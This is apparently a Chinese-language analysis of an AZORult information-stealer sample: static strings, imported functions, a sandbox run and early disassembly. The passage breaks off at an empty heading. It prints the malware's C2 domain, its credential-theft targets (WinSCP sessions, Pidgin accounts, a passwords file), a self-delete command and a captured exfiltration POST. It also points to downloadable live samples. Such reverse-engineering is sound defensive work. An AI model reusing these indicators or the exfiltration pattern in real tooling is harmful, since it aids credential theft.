# 一个azorult样本分析

## 0. 前言

根据百度，azorult是一种信息窃取的恶意软件。

该样本来自[ANY.RUN](https://app.any.run/tasks/b9ac50cb-2737-4270-be47-63a8f1b6352e/#)，标签有`trojan`、`rat`、`azorult`，文件名`unommbZo.exe`，md5: `4e1e1e459fef0e525f79f5747fa2f69a`。样本可直接在附件下载`unommbZo.bin.zip`，解压密码为`infected`。

## 1. 基本静态分析

### 1.1 PEiD结果

![image-20200918111338217](.\img\unom-peid.png)

所以程序使用Delphi开发的，里面可能存在base64编码。

### 1.2 包含的字符串

经PEid检测，样本未加壳，使用`strings`工具查看其包含的字符串：

```bash
2C5A87CB-758C-7293-47BC-475C65D699A584C5-7DC6-DC45-12A47C7DB587-F89F-78CD-96CA-FD478543C7F4		# 不知道是什么，看起来很可疑的样子
SOFTWARE\Borland\Delphi\RTL
SOFTWARE\Microsoft\Windows NT\CurrentVersion
SOFTWARE\Microsoft\Cryptography
Software\Martin Prikryl\WinSCP 2\Sessions\		# 注册表？
ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/	# base64编码
%APPDATA%\.purple\accounts.xml
%TEMP%\curbuf.dat
https://dotbit.me/a/
http://ip-api.com/json		
kirill0v.beget.tech			# 可疑的网址
/c %WINDIR%\system32\timeout.exe 3 & del "		# 执行的命令
User-agent: 
Mozilla/4.0 (compatible; MSIE 6.0b; Windows NT 5.1)		# 硬编码的请求头
PasswordsList.txt		# 文件名
```

除了上面的这些结果外，字符串输出中还包含一些进行了base64编码的变量名、注册表信息，目前还不知道有什么用。除此之外，还包含带有通配符的文件名，这里不再一一列举。

### 1.3 导入函数信息

```bash
ReleaseDC	GetSystemMetrics	GetDC		# 获取屏幕信息，截图？
GetComputerNameW	GetUserNameW			# 收集系统信息
FindFirstFileW	FindNextFileW	CreateFileW	CopyFileW		# 文件操作
GetTickCount	QueryPerformanceCounter		# 反调试？
Process32FirstW	Process32NextW	CreateProcessW		# 进程操作
RegCreateKeyExW	RegQueryValueExW	RegCloseKey	RegOpenKeyExW	# 注册表操作
CryptAcquireContextA	CryptCreateHash	CryptHashData
CryptGetHashParam	CryptDestroyHash	CryptReleaseContext		# 加密操作
ShellExecuteExW		# 命令执行
wsock32.dll		wininet.dll		# 网络操作
```



除了上面的两项信息之外，从PEView中查看该样本的`IMAGE_OPTIONAL_HEADER`，可以看出样本是一个Windows GUI程序。

## 2. 基本动态分析

一开始我用`ApateDNS`和`Inetsim`搭建了一个虚拟的网络环境，然后用`Wireshark`抓包，火绒剑进行监控，可以发现样本做了一些信息收集和联网操作，但是因为无法从C2服务器上获得进一步信息，所以我对于样本的分析也不完整。最后我为虚拟机设置了一个桥接的网卡，直接连接外网，想看一下样本和服务器的通信情况。

### 2.1 火绒剑输出

下面是有关注册表的一些操作，样本查询了大量的注册表值，这里应该是在收集信息：

![image-20200918193231447](.\img\unom-huorong1.png)

还可以看到`svchost.exe`进程也打开了`unommbZo`进程：

![image-20200918193723288](.\img\unom-huorong2.png)

以及联网操作：

![image-20200918194258739](.\img\unom-huorong3.png)

可以看到样本和`kirill0v.beget.tech/index.php`建立 了连接，接下来看一下联网操作发送了什么内容。

### 2.2 Wireshark抓包

![image-20200918103038801](.\img\unom-wireshark.png)

上图是抓包结果，完整的请求如下：

```
POST /index.php HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0b; Windows NT 5.1)
Host: kirill0v.beget.tech
Content-Length: 91
Cache-Control: no-cache

...E..&f.&f.F..0l.1..0f.0a.0f.&f.F..0c.1..0l.0e.&f.B..&f.&g.E..@..Ap.;p.G..&f.Fp.3p.;p.6p.5
```

明文看不出什么信息，所以可能进行了编码或者加密。

遗憾的是，连接已经关闭了：

![image-20200918194436627](.\img\unom-wireshark2.png)

所以我最终是从ANY.RUN上把C2服务器返回的内容下载了下来，你可以从附件获取该内容`index.php.zip`，解压密码为`infected`。

## 3. 详细分析

### 3.1 主函数

先把服务器的响应放到一边，看一下样本的详细内容。由于这个样本是用Delphi编译的，因此`IDA`的分析效果不是特别好，同时使用`IDR`和`Ollydbg`协助分析。

将样本导入`IDA`后，发现入口点的`start`函数中，在`InitExe`和`Halt0`之间，只调用了一个函数`sub_419108`，这应该就是主函数了，重命名为`main_function`，然后双击进入该函数。

![image-20200918104904807](.\img\unom-ida1.png)

下图显示了`main_function`的前半部分，基本覆盖了从样本开始执行到接收从C2服务器发过来的响应这一部分内容，本文就分析这一段内容。

![image-20200918201306881](.\img\unom-ida2.png)

### 3.2 sub_407D24

第一个样本内函数调用已经进行了重命名，为`load_kernel32`。直接看下一个函数`sub_407D24`，该函数内调用了三次`sub_407B78`，在OD中分析该函数：

![image-20200918203307295](.\img\unom-od1.png)

之后，该函数还调用了`CheckTokenMembership`和`FreeSid`，它在检查用户权限。

除了调用三次`sub_407B78`外，该函数还调用了一次`sub_407C58`，这两个函数的结构类似，只不过后者检查的是系统权限：

![image-20200918204040432](.\img\unom-od2.png)

所以得到了函数`sub_407D24`的完成流程为：

![image-20200918204240225](.\img\unom-ida4.png)

### 3.3 sub_406C4C

